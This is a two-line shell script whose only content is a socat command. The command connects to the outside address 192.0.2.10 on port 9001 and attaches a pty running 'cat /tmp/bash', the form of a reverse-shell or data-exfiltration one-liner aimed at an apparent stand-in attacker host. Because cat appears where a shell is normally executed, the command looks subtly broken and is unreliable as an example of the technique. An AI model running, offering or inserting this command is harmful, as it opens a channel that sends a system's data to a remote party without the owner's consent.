#!/bin/sh
socat EXEC:'cat /tmp/bash',pty TCP:192.0.2.10:9001
